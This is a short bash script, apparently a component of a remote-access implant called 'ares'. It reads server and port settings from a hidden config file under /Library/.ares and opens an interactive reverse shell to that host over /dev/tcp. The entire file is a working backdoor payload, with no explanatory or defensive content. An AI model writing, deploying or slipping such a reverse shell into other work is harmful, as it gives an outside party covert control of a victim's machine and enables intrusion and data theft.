#!/bin/bash
source /Library/.ares/ares.conf
bash -i >& /dev/tcp/$SERVER/$PORT 0>&1
wait
